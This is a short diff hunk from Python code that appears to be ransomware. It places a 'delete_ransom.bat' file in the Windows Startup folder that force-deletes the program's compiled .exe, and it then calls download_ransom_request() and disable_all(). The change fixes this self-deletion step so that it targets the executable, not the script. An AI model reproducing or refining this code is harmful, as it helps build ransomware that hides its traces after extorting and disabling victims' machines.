@@ -72,8 +72,8 @@ def main():
                     pass
 
     with open('C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\delete_ransom.bat'.format(os.getenv('username')),'w') as in_file:
-        in_file.write('del /Q /S /F {}'.format(os.path.abspath(__file__)))
-        in_file.close()
+        file_path = os.path.splitext(os.path.abspath(__file__))        
+        in_file.write('del /Q /S /F {}'.format(str(file_path[0])+'.exe'))
     download_ransom_request()
     disable_all()
 
